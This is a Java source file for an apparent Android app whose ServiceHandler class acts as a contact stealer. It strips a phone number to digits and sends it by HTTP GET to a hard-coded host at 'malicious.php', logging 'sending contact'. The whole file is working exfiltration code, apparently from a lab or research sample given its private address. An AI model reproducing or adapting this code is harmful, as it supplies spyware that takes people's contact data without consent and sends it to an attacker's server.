package com.example.contactstealerblock;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;

import android.util.Log;

public class ServiceHandler {
    
    static InputStream is = null;
    static String response = null;
        
public String makeServiceCall(String url, List<NameValuePair> number,String num) {
        try {
            
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpEntity httpEntity = null;
            HttpResponse httpResponse = null;

            if (number != null) {
                    String paramString = URLEncodedUtils
                            .format(number, "utf-8");
                    url += "?" + paramString;
                }
            num = parseNum(num);
            Log.d("ANDROID MSG","sending contact : "+num);
                HttpGet httpGet = new HttpGet();
                httpGet.setURI(new URI("http://192.168.56.103/malicious.php?number="+num));
                httpResponse = httpClient.execute(httpGet);
                
                if(httpResponse != null){
                	Log.d("ANDROID MSG","sending finished."+num);
                    httpEntity = httpResponse.getEntity();
                	is = httpEntity.getContent();
                }

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

       

        return response;
   }

   private String parseNum(String num){
	   String num2 = "";
	   char ch;
	   for(int i=0;i<num.length();i++){
		    ch = num.charAt(i);
		   if(ch>=48 && ch<=57){
			   num2 += ch;
		   }
	   }
	   
	   return num2;
   }
}
